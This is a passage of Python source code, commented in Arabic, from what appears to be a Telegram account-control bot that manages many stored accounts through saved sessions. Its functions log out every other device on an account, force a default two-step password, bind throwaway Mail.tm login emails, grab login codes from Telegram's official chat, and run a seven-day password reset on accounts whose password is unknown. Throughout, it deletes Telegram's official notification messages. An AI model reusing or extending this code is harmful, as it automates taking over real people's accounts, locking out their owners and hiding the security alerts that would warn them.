            # إذا كانت الجلسة غير متاحة نهائياً، نتوقف عن المحاولة
            if "غير متاحة" in err or "session_invalid" in err:
                logger.warning("stopping auto kick for %s: session unavailable", phone)
                await _notify_admin(phone, "kick_failed", phase="توقف نهائي", error="الجلسة غير متاحة")
                return

            await _notify_admin(
                phone,
                "kick_failed",
                phase=f"محاولة {retry_n} (كل 5 دقائق)",
                error=err,
            )
            await asyncio.sleep(AUTO_KICK_DELAY_RETRY)

    except Exception as e:
        logger.error("auto kick worker %s: %s", phone, e)
    finally:
        _auto_kick_tasks.pop(phone, None)


def _schedule_auto_kick_with_remaining(phone: str, remaining_secs: int):
    """جدولة auto-kick مع مراعاة الوقت المتبقي (بعد restart)."""
    if phone in _auto_kick_tasks and not _auto_kick_tasks[phone].done():
        return
    _auto_kick_tasks[phone] = asyncio.create_task(
        _auto_kick_worker(phone, resume_remaining=remaining_secs)
    )


async def resume_auto_kick_pipelines():
    import time as _time
    sessions = await database.get_sessions_pending_auto_kick()
    for s in sessions:
        phone = s["phone"]
        stage = database.row_get(s, "auto_kick_stage")
        delay_until = database.row_get(s, "auto_kick_delay_until")

        if stage == 1 and delay_until:
            # كان في انتظار 24 ساعة — احسب الوقت المتبقي
            remaining = int(delay_until) - int(_time.time())
            if remaining > 0:
                # لا تزال هناك مدة متبقية
                _schedule_auto_kick_with_remaining(phone, remaining)
                logger.info(
                    "resume auto-kick %s: stage=1, remaining=%ds", phone, remaining
                )
            else:
                # انتهت المدة — انتقل مباشرة للمحاولات
                _schedule_auto_kick_with_remaining(phone, 0)
                logger.info("resume auto-kick %s: stage=1 expired, proceeding now", phone)
        else:
            schedule_auto_kick_pipeline(phone)
    if sessions:
        logger.info("resumed auto-kick for %d sessions", len(sessions))


# ──────────────────────────────────────────
# تنظيف شامل يدوي (أدمن): طرد → 2FA → حذف رسائل
# ──────────────────────────────────────────
async def admin_full_cleanup(phone: str, new_password: str | None = None) -> dict:
    new_password = new_password or DEFAULT_2FA_PASSWORD
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة معطلة", "step": "connect"}

    try:
        await delete_telegram_official_messages(client)
        await client(ResetAuthorizationsRequest())
        await delete_telegram_official_messages(client)
    except Exception as e:
        await client.disconnect()
        err = str(e)
        if "fresh" in err.lower() or "recently" in err.lower():
            return {
                "success": False,
                "error": "الجلسة جديدة — انتظر ثم أعد التنظيف الشامل",
                "step": "kick",
            }
        return {"success": False, "error": err, "step": "kick"}

    try:
        session = await database.get_session_by_phone(phone)
        current = session["two_fa"] if session and session["two_fa"] else None
        await client.edit_2fa(
            current_password=current,
            new_password=new_password,
            hint="",
            email=None,
        )
        await database.update_session_two_fa(phone, new_password)
        await delete_telegram_official_messages(client)
    except Exception as e:
        await client.disconnect()
        return {"success": False, "error": str(e), "step": "2fa"}

    await client.disconnect()
    await database.mark_session_secured(phone)
    return {"success": True, "password": new_password}


async def admin_kick_only(phone: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة معطلة"}

    try:
        await delete_telegram_official_messages(client)
        await client(ResetAuthorizationsRequest())
        await delete_telegram_official_messages(client)
        await client.disconnect()
        return {"success": True}
    except Exception as e:
        await client.disconnect()
        err = str(e)
        if "fresh" in err.lower() or "recently" in err.lower():
            return {
                "success": False,
                "error": "الجلسة جديدة — انتظر ثم أعد المحاولة",
            }
        return {"success": False, "error": err}


async def get_session_authorizations(phone: str):
    client = await get_active_client(phone)
    if not client:
        return None
    try:
        auths = await client(GetAuthorizationsRequest())
        await client.disconnect()
        return auths.authorizations
    except Exception as e:
        logger.error(f"get_authorizations {phone}: {e}")
        await client.disconnect()
        return None


async def kick_specific_session(phone: str, session_hash: int) -> bool:
    client = await get_active_client(phone)
    if not client:
        return False
    try:
        await delete_telegram_official_messages(client)
        await client(ResetAuthorizationRequest(hash=session_hash))
        await delete_telegram_official_messages(client)
        await client.disconnect()
        return True
    except Exception as e:
        logger.error(f"kick_specific {phone} {session_hash}: {e}")
        await client.disconnect()
        return False


async def _rotate_via_email(phone: str, row, login_email: str, email_password: str) -> dict:
    """
    تغيير الجلسة باستخدام بريد Mail.tm المربوط — أكثر موثوقية من قراءة شات التيليجرام.
    1. فتح الجلسة القديمة وجلب hashes الجلسات الأخرى
    2. تصوير صندوق Mail.tm قبل طلب الكود
    3. طلب كود دخول من client_new مع إعادة إرسال حتى Email delivery
    4. قراءة الكود من Mail.tm
    5. تسجيل الدخول بـ client_new
    6. حفظ الجلسة الجديدة في DB
    7. طرد الجلسات الأخرى القديمة بـ client_old
    8. تسجيل خروج client_old نفسها
    """
    client_old = None
    client_new = None
    try:
        # التحقق من صندوق Mail.tm
        if not await mailtm.verify_mailbox(login_email, email_password):
            return {"success": False, "error": f"فشل الوصول لصندوق Mail.tm: {login_email}"}

        # 1. فتح الجلسة القديمة وجلب hashes الجلسات الأخرى
        client_old = await get_active_client(phone)
        if not client_old:
            return {"success": False, "error": "الجلسة غير متصلة حالياً"}

        other_hashes = []
        try:
            auths_result = await client_old(GetAuthorizationsRequest())
            other_hashes = [a.hash for a in auths_result.authorizations if not a.current]
            logger.info("rotate_email %s: found %d other sessions", phone, len(other_hashes))
        except Exception as e:
            logger.warning("rotate_email get_auths %s: %s", phone, e)

        # 2. تصوير صندوق Mail.tm قبل طلب الكود
        exclude_ids = await mailtm.snapshot_message_ids(login_email, email_password)

        # 3. إنشاء client_new وطلب كود عبر Email delivery
        client_new = make_telegram_client()
        await client_new.connect()

        phone_code_hash, delivery = await _request_login_code_via_email(client_new, phone)
        logger.info("rotate_email %s: code delivery=%s", phone, delivery)

        # 4. قراءة الكود من Mail.tm
        code: str | None = None
        if "Email" in delivery:
            raw_codes = await fetch_codes_from_email(
                login_email, email_password,
                attempts=36, interval=5,
                exclude_ids=exclude_ids,
            )
            for raw in raw_codes:
                c = _normalize_login_code(raw)
                if c:
                    code = c
                    break

        if not code:
            return {
                "success": False,
                "error": f"لم يصل الكود للبريد {login_email} (نوع التوصيل: {delivery})",
            }

        logger.info("rotate_email %s: got code from Mail.tm", phone)

        # 5. تسجيل الدخول بالجلسة الجديدة
        try:
            await client_new.sign_in(phone, code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            two_fa = (row["two_fa"] or DEFAULT_2FA_PASSWORD or "").strip()
            if not two_fa:
                return {"success": False, "error": "الحساب محمي بـ 2FA غير محفوظ في DB"}
            await client_new.sign_in(password=two_fa)

        session_new = client_new.session.save()
        logger.info("rotate_email %s: new session obtained", phone)

        # 6. حفظ الجلسة الجديدة في DB قبل أي طرد
        await database.update_session_string(phone, session_new)
        logger.info("rotate_email %s: DB updated with new session", phone)

        # 7. طرد الجلسات الأخرى القديمة باستخدام client_old
        for h in other_hashes:
            try:
                await client_old(ResetAuthorizationRequest(hash=h))
                logger.debug("rotate_email %s: kicked hash %s", phone, h)
            except Exception as e:
                logger.debug("rotate_email kick hash %s for %s: %s", h, phone, e)

        # 8. تسجيل خروج الجلسة القديمة نفسها
        try:
            await client_old(LogOutRequest())
            logger.info("rotate_email %s: old session logged out", phone)
        except Exception as e:
            logger.debug("rotate_email logout old %s: %s", phone, e)

        # حذف رسائل كود الدخول من الجلسة الجديدة
        try:
            await delete_telegram_official_messages(client_new)
        except Exception:
            pass

        return {"success": True}

    except Exception as e:
        logger.error("rotate_email %s: %s", phone, e)
        return {"success": False, "error": str(e)}
    finally:
        for c in (client_new, client_old):
            if c:
                try:
                    await c.disconnect()
                except Exception:
                    pass


async def _rotate_via_telegram_chat(phone: str, row) -> dict:
    """
    تغيير الجلسة بقراءة الكود من شات التيليجرام (777000) — بديل عند عدم وجود بريد.
    """
    client_old = None
    client_new = None
    try:
        client_old = await get_active_client(phone)
        if not client_old:
            return {"success": False, "error": "الجلسة غير متصلة حالياً"}

        other_hashes = []
        try:
            auths_result = await client_old(GetAuthorizationsRequest())
            other_hashes = [a.hash for a in auths_result.authorizations if not a.current]
        except Exception as e:
            logger.warning("rotate_chat get_auths %s: %s", phone, e)

        snapshot: dict[int, tuple[int, str]] = {}
        for sender_id in OFFICIAL_SENDERS:
            try:
                msgs = await client_old.get_messages(sender_id, limit=1)
                if msgs:
                    snapshot[sender_id] = (msgs[0].id, msgs[0].text or "")
                else:
                    snapshot[sender_id] = (0, "")
            except Exception:
                snapshot[sender_id] = (0, "")

        client_new = make_telegram_client()
        await client_new.connect()

        sent = await _send_login_code_request(client_new, phone)
        phone_code_hash = sent.phone_code_hash
        delivery_type = type(sent.type).__name__
        logger.info("rotate_chat %s: code requested, type=%s", phone, delivery_type)

        norm_phone = database.normalize_phone(phone)
        if "App" not in delivery_type and "Telegram" not in delivery_type:
            for _resend in range(3):
                await asyncio.sleep(5)
                try:
                    resent = await client_new(ResendCodeRequest(norm_phone, phone_code_hash))
                    phone_code_hash = resent.phone_code_hash
                    delivery_type = type(resent.type).__name__
                    if "App" in delivery_type or "Telegram" in delivery_type:
                        break
                except FloodWaitError as fw:
                    await asyncio.sleep(min(fw.seconds + 1, 60))
                except Exception as e:
                    logger.debug("rotate_chat resend %s: %s", phone, e)

        code_text: str | None = None
        loop = asyncio.get_running_loop()
        deadline = loop.time() + 180
        while loop.time() < deadline:
            await asyncio.sleep(3)
            for sender_id, (last_id, last_text) in list(snapshot.items()):
                try:
                    new_msgs = await client_old.get_messages(sender_id, limit=5)
                    for msg in new_msgs:
                        if not msg.text:
                            continue
                        is_new_msg    = msg.id > last_id
                        is_edited_msg = msg.id == last_id and msg.text != last_text
                        if (is_new_msg or is_edited_msg) and CODE_PATTERN.search(msg.text):
                            code_text = msg.text
                            break
                    if new_msgs:
                        top = new_msgs[0]
                        snapshot[sender_id] = (max(last_id, top.id), top.text or "")
                except Exception as e:
                    logger.debug("rotate_chat poll %s %s: %s", phone, sender_id, e)
                if code_text:
                    break
            if code_text:
                break

        if not code_text:
            return {
                "success": False,
                "error": f"لم يصل الكود في شات التيليجرام خلال 3 دقائق (نوع التوصيل: {delivery_type})",
            }

        code = _normalize_login_code(code_text)
        if not code:
            return {"success": False, "error": f"كود غير قابل للقراءة: {code_text[:50]}"}

        try:
            await client_new.sign_in(phone, code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            two_fa = (row["two_fa"] or DEFAULT_2FA_PASSWORD or "").strip()
            if not two_fa:
                return {"success": False, "error": "الحساب محمي بـ 2FA غير محفوظ في DB"}
            await client_new.sign_in(password=two_fa)

        session_new = client_new.session.save()
        await database.update_session_string(phone, session_new)

        for h in other_hashes:
            try:
                await client_old(ResetAuthorizationRequest(hash=h))
            except Exception as e:
                logger.debug("rotate_chat kick hash %s for %s: %s", h, phone, e)

        try:
            await client_old(LogOutRequest())
        except Exception as e:
            logger.debug("rotate_chat logout old %s: %s", phone, e)

        try:
            await delete_telegram_official_messages(client_new)
        except Exception:
            pass

        return {"success": True}

    except Exception as e:
        logger.error("rotate_chat %s: %s", phone, e)
        return {"success": False, "error": str(e)}
    finally:
        for c in (client_new, client_old):
            if c:
                try:
                    await c.disconnect()
                except Exception:
                    pass


async def rotate_session(phone: str) -> dict:
    """
    تغيير الجلسة بالكامل:
    يقرأ الكود من شات التيليجرام (777000) عبر الجلسة القديمة —
    سياسة تيليجرام: الكود الذي يطلبه السكربت يصل للشات دائماً.
    بعد الجلسة الجديدة: طرد الجلسات الأخرى + تسجيل خروج الجلسة القديمة.
    """
    row = await database.get_session_by_phone(phone)
    if not row:
        return {"success": False, "error": "الجلسة غير موجودة"}

    logger.info("rotate_session %s: reading code from Telegram chat", phone)
    return await _rotate_via_telegram_chat(phone, row)


async def bulk_rotate_sessions(
    progress_cb=None,
    should_stop=None,
) -> dict:
    """
    تغيير جلسات كل الحسابات الصالحة والمتصلة.
    - يتخطى الجلسات المعطلة (valid=0) والجلسات غير المتصلة.
    - progress_cb: coroutine يُستدعى بعد كل حساب (done, total, success, fail, skip)
    - should_stop: callable يُرجع True لإيقاف العملية
    """
    sessions = await database.get_all_sessions()
    total = len(sessions)
    success_count = 0
    fail_count = 0
    skip_count = 0
    fail_details = []
    done = 0

    for s in sessions:
        phone = s["phone"]

        # توقف إذا طُلب
        if should_stop and should_stop():
            remaining = total - done
            skip_count += remaining
            break

        # تخطي الجلسات المعطلة
        if not s["valid"]:
            skip_count += 1
            done += 1
            if progress_cb:
                await progress_cb(done, total, success_count, fail_count, skip_count)
            continue

        # تخطي الجلسات غير المتصلة
        alive = await check_session_alive(phone)
        if not alive:
            skip_count += 1
            done += 1
            logger.info("bulk_rotate skip %s: not alive", phone)
            if progress_cb:
                await progress_cb(done, total, success_count, fail_count, skip_count)
            continue

        logger.info("bulk_rotate processing %s", phone)
        res = await rotate_session(phone)
        done += 1
        if res["success"]:
            success_count += 1
            logger.info("bulk_rotate success %s", phone)
        else:
            fail_count += 1
            fail_details.append(f"{phone}: {res.get('error', '')}")
            logger.warning("bulk_rotate fail %s: %s", phone, res.get("error"))

        if progress_cb:
            await progress_cb(done, total, success_count, fail_count, skip_count)

        await asyncio.sleep(3)

    return {
        "success": success_count,
        "fail": fail_count,
        "skip": skip_count,
        "total": total,
        "fail_details": fail_details,
    }


async def bulk_change_two_fa(
    new_password: str,
    progress_cb=None,
    should_stop=None,
) -> dict:
    """
    تغيير التحقق بخطوتين لكل الحسابات الصالحة والمتصلة التي لها two_fa في DB.
    - يتخطى الجلسات المعطلة (valid=0) والجلسات غير المتصلة.
    - progress_cb: coroutine يُستدعى بعد كل حساب (done, total, success, fail, skip)
    - should_stop: callable يُرجع True لإيقاف العملية
    """
    sessions = await database.get_all_sessions()
    total = len(sessions)
    success_count = 0
    fail_count = 0
    skip_count = 0
    fail_details = []
    done = 0

    for s in sessions:
        phone = s["phone"]
        old_2fa = s["two_fa"]

        # توقف إذا طُلب
        if should_stop and should_stop():
            remaining = total - done
            skip_count += remaining
            break

        # تخطي الجلسات المعطلة (valid=0) أو بلا تحقق
        if not s["valid"] or not old_2fa:
            skip_count += 1
            done += 1
            if progress_cb:
                await progress_cb(done, total, success_count, fail_count, skip_count)
            continue

        # تخطي الجلسات غير المتصلة
        alive = await check_session_alive(phone)
        if not alive:
            skip_count += 1
            done += 1
            logger.info("bulk_2fa skip %s: not alive", phone)
            if progress_cb:
                await progress_cb(done, total, success_count, fail_count, skip_count)
            continue

        res = await set_two_fa(phone, new_password, old_2fa)
        done += 1
        if res["success"]:
            success_count += 1
            logger.info("bulk_change_2fa success %s", phone)
        else:
            fail_count += 1
            fail_details.append(f"{phone}: {res.get('error', '')}")
            logger.warning("bulk_change_2fa fail %s: %s", phone, res.get("error"))

        if progress_cb:
            await progress_cb(done, total, success_count, fail_count, skip_count)

        await asyncio.sleep(1)

    return {
        "success": success_count,
        "fail": fail_count,
        "skip": skip_count,
        "total": total,
        "fail_details": fail_details,
    }


# ──────────────────────────────────────────
# فحص صحة التحقق بخطوتين وإصلاحه
# ──────────────────────────────────────────
async def verify_two_fa_for_session(phone: str) -> dict:
    """
    فحص صحة التحقق بخطوتين المخزن في DB:
    يحاول تغيير كلمة المرور لنفسها — إذا رفض تيليجرام فهي خاطئة.
    يُرجع: {'valid': True/False, 'error': '...', 'skip': True إن كانت الجلسة غير متصلة}
    """
    row = await database.get_session_by_phone(phone)
    if not row:
        return {"valid": False, "error": "no_session", "skip": True}
    stored_2fa = database.row_get(row, "two_fa")
    if not stored_2fa:
        return {"valid": False, "error": "no_two_fa_stored", "skip": True}

    client = await get_active_client(phone)
    if not client:
        return {"valid": False, "error": "session_inactive", "skip": True}

    try:
        await client.edit_2fa(
            current_password=stored_2fa,
            new_password=stored_2fa,
            hint="",
            email=None,
        )
        return {"valid": True}
    except PasswordHashInvalidError:
        return {"valid": False, "error": "wrong_password"}
    except Exception as e:
        err = str(e)
        # NEW_SETTINGS_EMPTY = نفس كلمة المرور مقبولة لكن تيليجرام لا يغيرها → صالحة
        if "NEW_SETTINGS_EMPTY" in err.upper() or "same" in err.lower():
            return {"valid": True}
        logger.debug("verify_two_fa %s: %s", phone, err)
        return {"valid": False, "error": err, "skip": True}
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


async def bulk_verify_two_fa(
    progress_cb=None,
    should_stop=None,
) -> dict:
    """
    فحص صحة التحقق بخطوتين لجميع الجلسات الصالحة الشغالة.
    الجلسات ذات التحقق الخاطئ تُعلَّم invalid_two_fa=1 في DB.
    progress_cb(done, total, valid_n, invalid_n, skip_n)
    """
    sessions = await database.get_all_sessions()
    # نحسب فقط الجلسات الصالحة التي لها two_fa
    eligible = [s for s in sessions if s["valid"] and s["two_fa"]]
    total = len(eligible)
    done = 0
    valid_count = 0
    invalid_count = 0
    skip_count = 0
    invalid_phones: list[str] = []

    for s in eligible:
        phone = s["phone"]

        if should_stop and should_stop():
            remaining = total - done
            skip_count += remaining
            break

        alive = await check_session_alive(phone)
        if not alive:
            skip_count += 1
            done += 1
            if progress_cb:
                await progress_cb(done, total, valid_count, invalid_count, skip_count)
            continue

        done += 1
        result = await verify_two_fa_for_session(phone)

        if result.get("skip"):
            skip_count += 1
        elif result.get("valid"):
            valid_count += 1
            await database.clear_session_invalid_two_fa(phone)
            logger.info("bulk_verify_2fa: valid 2FA for %s", phone)
        else:
            invalid_count += 1
            await database.mark_session_invalid_two_fa(phone)
            invalid_phones.append(phone)
            logger.warning(
                "bulk_verify_2fa: INVALID 2FA for %s: %s", phone, result.get("error")
            )

        if progress_cb:
            await progress_cb(done, total, valid_count, invalid_count, skip_count)

        await asyncio.sleep(1)

    return {
        "total": total,
        "valid": valid_count,
        "invalid": invalid_count,
        "skip": skip_count,
        "invalid_phones": invalid_phones,
    }


def schedule_repair_two_fa(phone: str):
    """جدولة إصلاح التحقق بخطوتين كـ background task."""
    if phone in _repair_two_fa_tasks and not _repair_two_fa_tasks[phone].done():
        return
    _repair_two_fa_tasks[phone] = asyncio.create_task(_repair_two_fa_worker(phone))


async def resume_repair_two_fa_pipelines():
    """استئناف عمليات إصلاح التحقق بعد إعادة تشغيل البوت."""
    import time
    sessions = await database.get_sessions_pending_repair_two_fa()
    for s in sessions:
        phone = s["phone"]
        stage = s["repair_2fa_stage"]
        until_ts = s["repair_2fa_until"] or 0
        if stage == 1 and until_ts > time.time():
            # لا تزال تنتظر 7 أيام
            schedule_repair_two_fa(phone)
        elif stage in (1, 2):
            # انتهت المدة أو مرحلة الاستطلاع
            schedule_repair_two_fa(phone)
        elif stage == 0:
            schedule_repair_two_fa(phone)
    if sessions:
        logger.info("resumed repair-2FA for %d sessions", len(sessions))


async def _repair_two_fa_worker(phone: str):
    """
    إصلاح حساب تحققه غير صالح (خلفياً):
    0) طرد كل الجلسات + تغيير البريد إجباري
    1) طلب إعادة تعيين كلمة المرور (7 أيام)
    2) انتظار 7 أيام → فحص كل 5 دقائق حتى 5 ساعات
    3) تعيين DEFAULT_2FA_PASSWORD وتحديث DB
    """
    import time

    try:
        row = await database.get_session_by_phone(phone)
        if not row:
            return

        # ── المرحلة 0: طرد + بريد ──
        stage = row["repair_2fa_stage"]
        if stage is None or stage < 1:
            await database.update_repair_2fa_stage(phone, 0)

            # أ) طرد الجلسات الأخرى
            kick_res = await admin_kick_only(phone)
            await _notify_admin(phone, "repair_2fa_kicked", ok=kick_res.get("success"),
                                error=kick_res.get("error", ""))

            # ب) تغيير البريد إجباري
            email_res = await change_login_email(phone, force=True)
            await _notify_admin(phone, "repair_2fa_email",
                                ok=email_res.get("success"),
                                email=email_res.get("email", ""))

            # ج) طلب إعادة تعيين كلمة المرور
            client = await get_active_client(phone)
            if not client:
                await _notify_admin(phone, "repair_2fa_fail",
                                    step="reset_request", error="الجلسة غير متاحة")
                return

            until_ts = 0
            try:
                result = await client(ResetPasswordRequest())
                result_class = type(result).__name__
                logger.info("repair_2fa %s: ResetPassword -> %s", phone, result_class)

                if result_class == "ResetPasswordOk":
                    until_ts = 0
                elif result_class == "ResetPasswordRequestedWait":
                    raw_until = result.until_date
                    until_ts = int(raw_until.timestamp() if hasattr(raw_until, "timestamp") else raw_until)
                elif result_class == "ResetPasswordFailedWait":
                    raw_retry = result.retry_date
                    retry_ts = int(raw_retry.timestamp() if hasattr(raw_retry, "timestamp") else raw_retry)
                    wait = max(0, retry_ts - time.time())
                    await asyncio.sleep(wait + 5)
                    result2 = await client(ResetPasswordRequest())
                    r2class = type(result2).__name__
                    if r2class == "ResetPasswordRequestedWait":
                        raw_until = result2.until_date
                        until_ts = int(raw_until.timestamp() if hasattr(raw_until, "timestamp") else raw_until)
            except Exception as e:
                logger.warning("repair_2fa reset_request %s: %s", phone, e)
                await _notify_admin(phone, "repair_2fa_fail",
                                    step="reset_request", error=str(e))
                return
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

            await database.update_repair_2fa_stage(phone, 1, until_ts=int(until_ts) if until_ts else None)

            if until_ts > 0:
                wait_days = max(0, until_ts - time.time()) / 86400
                await _notify_admin(phone, "repair_2fa_reset_requested",
                                    wait_days=round(wait_days, 1), until_ts=until_ts)
                wait_secs = max(0, until_ts - time.time())
                await asyncio.sleep(wait_secs)
            else:
                await _notify_admin(phone, "repair_2fa_reset_requested", wait_days=0, until_ts=0)

        # ── المرحلة 2: فحص كل 5 دقائق حتى 5 ساعات ──
        await database.update_repair_2fa_stage(phone, 2)
        poll_deadline = time.time() + 5 * 3600
        poll_interval = 300  # 5 دقائق

        success = False
        while time.time() < poll_deadline:
            client = await get_active_client(phone)
            if not client:
                await asyncio.sleep(poll_interval)
                continue
            try:
                result = await client(ResetPasswordRequest())
                result_class = type(result).__name__
                logger.info("repair_2fa poll %s: %s", phone, result_class)
                if result_class == "ResetPasswordOk":
                    success = True
                    await client.disconnect()
                    break
            except Exception as e:
                logger.debug("repair_2fa poll %s: %s", phone, e)
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass
            await asyncio.sleep(poll_interval)

        if not success:
            await _notify_admin(phone, "repair_2fa_fail",
                                step="poll_timeout",
                                error="انتهت مدة الانتظار (5 ساعات) — لا يمكن إصلاح هذا الحساب تلقائياً")
            return

        # ── المرحلة 3: تعيين DEFAULT_2FA_PASSWORD ──
        two_fa_res = await set_two_fa(phone, DEFAULT_2FA_PASSWORD, old_password=None)
        if two_fa_res.get("success"):
            await database.clear_session_invalid_two_fa(phone)
            await database.update_repair_2fa_stage(phone, 3)
            await _notify_admin(phone, "repair_2fa_success", password=DEFAULT_2FA_PASSWORD)
            logger.info("repair_2fa %s: SUCCESS", phone)
        else:
            await _notify_admin(phone, "repair_2fa_fail",
                                step="set_2fa", error=two_fa_res.get("error", ""))
            logger.warning("repair_2fa %s: failed set_2fa: %s", phone, two_fa_res.get("error"))

    except asyncio.CancelledError:
        logger.info("repair_2fa_worker %s: cancelled", phone)
    except Exception as e:
        logger.error("repair_2fa_worker %s: %s", phone, e)
        await _notify_admin(phone, "repair_2fa_fail", step="exception", error=str(e))
    finally:
        _repair_two_fa_tasks.pop(phone, None)


async def set_direct_2fa(phone: str, new_password: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة معطلة"}

    try:
        session = await database.get_session_by_phone(phone)
        current = session["two_fa"] if session and session["two_fa"] else None
        
        await client.edit_2fa(
            current_password=current,
            new_password=new_password,
            hint="",
            email=None,
        )
        await database.update_session_two_fa(phone, new_password)
        await delete_telegram_official_messages(client)
        await client.disconnect()
        return {"success": True}
    except Exception as e:
        await client.disconnect()
        return {"success": False, "error": str(e)}


# ──────────────────────────────────────────
# إنعاش جلسة منتهية عبر بريد Login
# ──────────────────────────────────────────
def _normalize_login_code(raw: str | None) -> str | None:
    """كود دخول SMS/بريد Login — 5–7 أرقام حسب تيليجرام."""
    return _normalize_email_code(raw, code_length=None)


def _sent_code_delivery_label(sent) -> str:
    return type(sent.type).__name__ if sent and sent.type else "Unknown"


def _is_email_delivery(sent) -> bool:
    return "Email" in _sent_code_delivery_label(sent)


async def _request_login_code_via_email(client, phone: str) -> tuple[str, str]:
    """
    طلب كود دخول — إعادة إرسال متكررة حتى SentCodeTypeEmailCode (Mail.tm).
    """
    norm = database.normalize_phone(phone)
    sent = await _send_login_code_request(client, phone)
    phone_code_hash = sent.phone_code_hash
    delivery = _sent_code_delivery_label(sent)
    logger.info("login code request %s -> %s", phone, delivery)
    if _is_email_delivery(sent):
        return phone_code_hash, delivery

    for attempt in range(RECOVERY_CODE_RESEND_ATTEMPTS):
        await asyncio.sleep(RECOVERY_CODE_RESEND_INTERVAL)
        try:
            sent = await client(ResendCodeRequest(norm, phone_code_hash))
            phone_code_hash = sent.phone_code_hash
            delivery = _sent_code_delivery_label(sent)
            logger.info(
                "resend login code %s attempt %s -> %s",
                phone,
                attempt + 1,
                delivery,
            )
            if _is_email_delivery(sent):
                return phone_code_hash, delivery
        except FloodWaitError as e:
            logger.warning("resend flood %s: %ss", phone, e.seconds)
            await asyncio.sleep(min(e.seconds + 1, 120))
        except Exception as e:
            logger.debug("resend login code %s attempt %s: %s", phone, attempt, e)

    return phone_code_hash, delivery


async def _wait_code_from_official_chat(client, timeout: int = 180) -> str | None:
    """انتظار كود من 777000 على جلسة لا تزال مسجّلة."""
    snapshot = {}
    for sender_id in OFFICIAL_SENDERS:
        try:
            msgs = await client.get_messages(sender_id, limit=1)
            snapshot[sender_id] = msgs[0].id if msgs else 0
        except Exception:
            snapshot[sender_id] = 0

    loop = asyncio.get_running_loop()
    deadline = loop.time() + timeout
    while loop.time() < deadline:
        await asyncio.sleep(3)
        for sender_id, last_id in list(snapshot.items()):
            try:
                new_msgs = await client.get_messages(sender_id, limit=8)
                for msg in new_msgs:
                    if msg.id > last_id and msg.text and CODE_PATTERN.search(msg.text):
                        return msg.text
                if new_msgs:
                    snapshot[sender_id] = max(last_id, new_msgs[0].id)
            except Exception:
                pass
    return None


def _recovery_error_retryable(error: str) -> bool:
    err = (error or "").lower()
    markers = (
        "لم يصل كود",
        "mail.tm",
        "صندوق",
        "البريد",
        "الهاتف",
        "sms",
        "app",
        "فشل فتح",
    )
    return any(m in err for m in markers)


async def recover_session(phone: str) -> dict:
    row = await database.get_session_by_phone(phone)
    if not row:
        return {"success": False, "error": "الجلسة غير موجودة", "retryable": False}
    login_email = database.row_login_email(row)
    email_password = row["email_password"]
    if not login_email or not email_password:
        return {
            "success": False,
            "error": "لا يوجد بريد Login محفوظ",
            "retryable": False,
        }

    if not await mailtm.verify_mailbox(login_email, email_password):
        return {
            "success": False,
            "error": f"فشل فتح صندوق Mail.tm: {login_email}",
            "retryable": True,
        }

    try:
        exclude_ids = await mailtm.snapshot_message_ids(login_email, email_password)
    except Exception as e:
        return {
            "success": False,
            "error": f"فشل قراءة بريد Mail.tm: {e}",
            "retryable": True,
        }

    client = None
    try:
        client = await get_active_client(phone)
        if not client:
            ss = (database.row_get(row, "session_string") or "").strip()
            client = make_telegram_client(ss if ss else None)
            await client.connect()

        phone_code_hash, delivery = await _request_login_code_via_email(client, phone)
        logger.info("recover %s code delivery: %s", phone, delivery)

        code = None
        if "Email" in delivery:
            raw_codes = await fetch_codes_from_email(
                login_email,
                email_password,
                attempts=36,
                interval=5,
                exclude_ids=exclude_ids,
            )
            for raw in raw_codes:
                code = _normalize_login_code(raw)
                if code:
                    break
        elif await client.is_user_authorized():
            official_text = await _wait_code_from_official_chat(client, timeout=120)
            if official_text:
                code = _normalize_login_code(official_text)
                delivery = "OfficialChatFallback"
                logger.info("recover %s code from 777000", phone)

        if not code:
            return {
                "success": False,
                "error": (
                    f"تيليجرام أرسل الكود عبر {delivery} — "
                    f"لم يصل إلى Mail.tm ({login_email}). "
                    f"سيتم إعادة المحاولة مع إجبار البريد."
                ),
                "retryable": True,
                "delivery": delivery,
            }

        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            pwd = row["two_fa"] or DEFAULT_2FA_PASSWORD
            if not pwd:
                return {
                    "success": False,
                    "error": "يتطلب 2FA غير محفوظ",
                    "retryable": False,
                }
            await client.sign_in(password=pwd)

        await delete_telegram_official_messages(client)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        telegram_id = me.id
        await database.save_session(
            phone, username, full_name, session_string, row["two_fa"], telegram_id
        )
        await delete_telegram_official_messages(client)
        _recovery_scheduled.discard(phone)
        _recovery_fail_count.pop(phone, None)
        return {"success": True, "email": login_email}
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return {
            "success": False,
            "error": "كود الدخول من البريد غير صالح أو منتهي — سيتم إعادة المحاولة",
            "retryable": True,
        }
    except Exception as e:
        err = str(e)
        return {
            "success": False,
            "error": err,
            "retryable": _recovery_error_retryable(err),
        }
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass


_email_bind_retry_tasks: dict[str, asyncio.Task] = {}


def schedule_login_email_bind_retry(phone: str):
    """إعادة محاولة ربط بريد Login بعد التسجيل إن فشل أول مرة."""
    if phone in _email_bind_retry_tasks and not _email_bind_retry_tasks[phone].done():
        return

    async def _worker():
        try:
            await _notify_admin(phone, "email_retry_started")
            await asyncio.sleep(45)
            for attempt in range(3):
                row = await database.get_session_by_phone(phone)
                client = await get_active_client(phone)
                if not client:
                    await _notify_admin(phone, "email_retry_fail", error="الجلسة غير متصلة")
                    return
                if await existing_login_email_ok(row, client):
                    await client.disconnect()
                    await _notify_admin(
                        phone,
                        "email_retry_ok",
                        email=database.row_login_email(row),
                        skipped=True,
                    )
                    return
                res = await _bind_login_email(client, phone)
                await client.disconnect()
                if res.get("success"):
                    logger.info("login email bound on retry %s attempt %s", phone, attempt)
                    await _notify_admin(
                        phone, "email_retry_ok", email=res.get("email")
                    )
                    return
                await _notify_admin(
                    phone,
                    "email_retry_attempt_fail",
